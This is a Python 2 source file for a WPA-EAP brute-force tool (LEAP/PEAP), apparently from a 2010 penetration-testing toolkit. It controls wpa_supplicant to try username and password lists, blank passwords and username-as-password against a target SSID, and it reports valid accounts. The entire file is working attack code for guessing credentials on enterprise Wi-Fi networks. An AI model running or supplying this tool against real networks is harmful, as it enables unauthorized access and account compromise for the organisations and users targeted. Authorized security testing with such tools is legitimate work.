#!/usr/bin/env python

'''WPA-EAP LEAP/PEAP Brute Force Logon Script'''

__author__    = 'JoMo-Kun <jmk@foofus.net>'
__copyright__ = '(c) 2010 JoMo-Kun <jmk@foofus.net>'
__license__   = 'GPLv2'
__version__   = '0.1'

import os
import sys
import time
import wpactrl
import re
from optparse import OptionParser

def options_list():
    parser = OptionParser(usage="usage: %prog [-s SSID] [-u username|-U file] [-p password|-P file] [-c file] [-n] [-s] [-l]", version="%prog " + __version__)
    parser.add_option("-s", "", dest="ssid", action="store", help="SSID\n")
    parser.add_option("-c", "", dest="combofile", action="store", help="Account credential file (user:pass)\n")
    parser.add_option("-u", "", dest="username", action="store", help="Target username\n")
    parser.add_option("-U", "", dest="userfile", action="store", help="Target username file\n")
    parser.add_option("-p", "", dest="password", action="store", help="Target password\n")
    parser.add_option("-P", "", dest="passfile", action="store", help="Target password file\n")
    parser.add_option("-n", "", dest="nopass", action="store_true", help="Test blank password\n")
    parser.add_option("-e", "", dest="userpass", action="store_true", help="Test password matching username\n")
    parser.add_option('-l', "", dest="leap", action="store_true", help="Enable LEAP (default PEAP)")
    (options, args) = parser.parse_args()
    
    run = '/var/run/wpa_supplicant'
  
    if not bool(options.ssid):
        print "Target SSID must be specified."
        sys.exit(1)

    if bool(options.combofile):
      if bool(options.username) | bool(options.userfile):
        print "Combo option cannot be combined with username options"
        sys.exit(1)
    else:
      if bool(options.username) & bool(options.userfile):
        print "Username options (-u/-U) are mutually exclusive."
        sys.exit(1)
      elif not (bool(options.username) | bool(options.userfile)):
        print "One of the following options is requied: -c/-u/-U."
        sys.exit(1)
      elif not (bool(options.password) | bool(options.passfile) | bool(options.nopass) | bool(options.userpass)):
        print "Password option (i.e. -p/-P/-n/-s) must be specified with username options"
        sys.exit(1)

    return (run, options)


def check_account(wpa, wpa_event, id, username, password):
  print ">>> Testing username: " + username + " password: " + password
  
  wpa.request('SET_NETWORK ' + id + ' identity "' + username + '"')
  wpa.request('SET_NETWORK ' + id + ' password "' + password + '"')
  wpa.request('ENABLE_NETWORK ' + id)
  wpa.request('LOGON')
            
  print '>>> Waiting for logon response ...'
  while True:
    results = wpa_event.recv()
    print "* " + results
    if re.search("EAP-MSCHAPV2: failure message: 'FAILED'", results):
      logon_valid = False
      break
    if re.search("CTRL-EVENT-EAP-FAILURE EAP authentication failed", results):
      logon_valid = False
      break
    elif re.search("EAP-MSCHAPV2: Authentication succeeded", results):
      logon_valid = True
      break
    elif re.search("EAP-SUCCESS EAP authentication completed successfully", results):
      logon_valid = True
      break
    elif re.search("completed \(reauth\)", results):
      print '>>> wpa_supplicant re-authenticated using existing key. The current credentials may not be valid.'
      logon_valid = True
      break

  print '\033[93m>>> Result of logon attempt: ', username, '/', password, ' --> ', logon_valid, '\033[0m'

  time.sleep(2) 
  wpa.request('LOGOFF')
  time.sleep(2) 

  return logon_valid


def main():
    (run, options) = options_list()

    print '>>> wpactrl version %d.%d.%d ...' % wpactrl.version()
    # http://w1.fi/wpa_supplicant/devel/ctrl_iface_page.html

    sockets = []
    if os.path.isdir(run):
        try:
            sockets = [os.path.join(run, i) for i in os.listdir(run)]
        except OSError, error:
            print 'Error:', error
            sys.exit(1)

    if len(sockets) < 1:
        print 'No wpa_ctrl sockets found in %s, aborting.' % run
        sys.exit(1)

    for s in sockets:
        try:
            print '>>> Open a ctrl_iface connection'
            print '>>> wpa = wpactrl.WPACtrl("%s")' % s
            wpa = wpactrl.WPACtrl(s)

            print '>>> Open a new ctrl_iface connection for receiving event messages'
            print '>>> wpa_event = wpactrl.WPACtrl("%s")' % s
            wpa_event = wpactrl.WPACtrl(s)
            wpa_event.attach()

            print '>>> Check current setup'
            wpa.request('LOGOFF')
            wpa.request('STATUS VERBOSE')
            wpa.request('LIST_NETWORKS')

            print '>>> Configure target network'
            id = wpa.request("ADD_NETWORK").rstrip('\n')
            wpa.request('SELECT_NETWORK ' + id)
            wpa.request('SET_NETWORK ' + id + ' ssid "' + str(options.ssid) + '"')
            
            if bool(options.leap):
              wpa.request('SET_NETWORK ' + id + ' key_mgmt IEEE8021X')
              wpa.request('SET_NETWORK ' + id + ' eap LEAP')
            else:
              wpa.request('SET_NETWORK ' + id + ' proto RSN')
              wpa.request('SET_NETWORK ' + id + ' key_mgmt WPA-EAP')
              wpa.request('SET_NETWORK ' + id + ' pairwise CCMP TKIP')
              wpa.request('SET_NETWORK ' + id + ' eap PEAP')

            if bool(options.combofile):
              try:
                f = open(options.combofile, 'r')
                credentials = f.readlines()

                for x in credentials:
                  username, password = x.split(':')
                  password = password.rstrip('\n')
             
                  if check_account(wpa, wpa_event, id, username, password):
                    print '\033[94m>>> Found valid account: ' + username + '/' + password + '\033[0m' 
                    break

              except IOError:
                print "Error: Cannot read %s.\n" %(options.combofile,)
                sys.exit(1)

            else:
              if bool(options.userfile):
                try:
                  f = open(options.userfile, 'r')
                  usernames = f.readlines()
                except IOError:
                  print "Error: Cannot read %s.\n" %(options.userfile,)
                  sys.exit(1)
              else:
                usernames = [options.username]    

              done = False
              for username in usernames:
                username = username.rstrip('\n')

                if bool(options.nopass):
                  if check_account(wpa, wpa_event, id, username, ""):
                    print '\033[94m>>> Found valid account: ' + username + '/' + password + '\033[0m' 
                    break
               
                if bool(options.userpass):
                  if check_account(wpa, wpa_event, id, username, username):
                    print '\033[94m>>> Found valid account: ' + username + '/' + username + '\033[0m' 
                    break

                if (bool(options.passfile) | bool(options.password)):
                  passwords = []
                  if bool(options.passfile):
                    try:
                      f = open(options.passfile, 'r')
                      passwords = f.readlines()
                    except IOError:
                      print "Error: Cannot read %s.\n" %(options.passfile,)
                      sys.exit(1)
                
                  if bool(options.password):
                    passwords.insert(0, options.password)

                  for password in passwords:
                    password = password.rstrip('\n')
                    if check_account(wpa, wpa_event, id, username, password):
                      print '\033[94m>>> Found valid account: ' + username + '/' + password + '\033[0m' 
                      done = True
                      break

                  if done:
                    break

            wpa.request('REMOVE_NETWORK ' + id)
            wpa_event.detach()

            print '>>> # Finished!'
        except wpactrl.error, error:
            print 'Error:', error
            pass


if __name__ == "__main__":
  main()
  sys.exit(0)
